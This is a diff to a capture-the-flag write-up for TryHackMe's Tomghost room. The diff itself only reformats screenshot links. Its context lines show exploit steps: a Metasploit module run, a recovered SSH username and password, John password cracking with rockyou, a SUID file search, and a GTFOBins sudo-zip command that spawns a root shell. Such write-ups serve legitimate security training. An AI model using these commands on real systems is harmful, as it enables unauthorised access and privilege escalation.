@@ -49,7 +49,7 @@ Shellcodes: No Results
 - use 0
 - set up rhosts and exploit
 
-https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(2).png
+![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(2).png)
 
 ```jsx
 skyfuck:8730281lkjlkjdqlksalks
@@ -59,7 +59,7 @@ skyfuck:8730281lkjlkjdqlksalks
 
 - use the above credential and login via ssh
 
-https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(3).png
+![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(3).png)
 
 ```jsx
 find / -type f -name user.txt 2> /dev/null
@@ -108,7 +108,7 @@ Then, start cracking it with John.
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
-https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(4).png
+![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(4).png)
 
 ```jsx
 alexandru 
@@ -155,9 +155,9 @@ find / -perm -u=s -type f 2>/dev/null
 
 Look for files with the SUID bit, which allows us to run files with elevated privileges beyond the current user.
 
-https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(5).png
+![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(5).png)
 
-https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(6).png
+![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(6).png)
 
 - we can find that in GTFOBins
 - we will use that commands
@@ -167,7 +167,7 @@ TF=$(mktemp -u)
 sudo /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'
 ```
 
-https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(7).png
+![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(7).png)
 
 Finally, we got the root.
 
